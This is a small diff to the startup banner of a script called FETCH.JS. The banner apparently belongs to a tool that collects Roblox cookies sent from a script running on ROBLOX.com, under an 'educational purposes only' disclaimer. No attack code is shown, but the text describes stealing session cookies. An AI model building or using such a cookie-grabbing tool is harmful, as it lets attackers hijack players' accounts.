@@ -6,7 +6,7 @@ console.log(`
     ${chalk.bgBlueBright.white(' FETCH.JS ')}
 
     This script fetches the ${chalk.bgRedBright.white('ALL')} 
-    cookies from ${chalk.bgGray('ROBLOX.com')}.
+    cookies recieved from the script running in ${chalk.bgGray('ROBLOX.com')}.
 
     ${chalk.bgRedBright(' !!! WARNING: THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY !!! ')}
 
